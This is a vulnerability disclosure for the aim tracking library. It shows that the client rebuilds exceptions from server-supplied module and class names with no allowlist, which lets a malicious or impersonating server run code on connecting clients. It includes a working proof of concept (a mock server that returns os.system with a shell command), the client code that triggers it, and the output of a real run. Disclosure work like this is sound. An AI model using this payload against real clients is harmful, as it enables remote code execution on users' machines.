**Verification: DYNAMICALLY-REPRODUCED** (PoC executed in WSL2; output from real run)

## Description

`raise_exception()` in `aim/ext/transport/message_utils.py` reconstructs a server-provided exception on the client without any allowlist:

```python
module = importlib.import_module(server_exception.get('module_name'))
exception = getattr(module, server_exception.get('class_name'))
args = json.loads(server_exception.get('args') or [])
raise exception(*args) if args else exception()
```

`module_name`, `class_name` and `args` come entirely from the tracking server's error response — no module allowlist, no check that the target is an `Exception` subclass. This runs on every client error path (`get_resource_handler`, `release_resource`, `_run_read_instructions`, `_run_write_instructions` in `aim/ext/transport/client.py`) whenever the server answers HTTP 400 with an `exception` payload.

## Impact

A malicious, compromised, or man-in-the-middle tracking server achieves arbitrary code execution on every client that connects to it. The client tries plain HTTP before HTTPS (`Client.protocol_probe`), so an on-path attacker on an untrusted network can also inject such responses. Team-shared central tracking servers are the documented deployment model — compromising (or impersonating) one server fans out to all members' training machines.

## PoC

Verified against aim v3.29.1 (source install). A mock "evil" tracking server answers any RPC with:

```python
self._send(400, {"exception": {
    "module_name": "os", "class_name": "system",
    "args": json.dumps([f"id > /tmp/aim_repro_rce_proof"]),
    "message": "boom",
}})
```

The victim client is a plain aim SDK `Client` that requests any resource:

```python
from aim.ext.transport.client import Client
client = Client("127.0.0.1:53901")          # evil server address
try:
    client.get_resource_handler(None, "Repo", args=b"")
except BaseException:
    pass
```

## Execution result

```
File ".../aim/ext/transport/message_utils.py", line 66, in raise_exception
    raise exception(*args) if args else exception()
TypeError: exceptions must derive from BaseException
[victim] caught: TypeError('exceptions must derive from BaseException')
[PROOF] command executed on client host, output of id():
uid=1000(iot) gid=1000(iot) groups=1000(iot),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),988(docker)

[RESULT] {"poc": "aim-01-client-rce", "verdict": "REPRODUCED",
          "proof_file": "/tmp/aim_repro_rce_proof"}
```

The command ran on the client host before the (expected) `TypeError` from `raise <int>` — `/tmp/aim_repro_rce_proof` contains the `id` output, and the traceback lands exactly on the `raise exception(*args)` line.
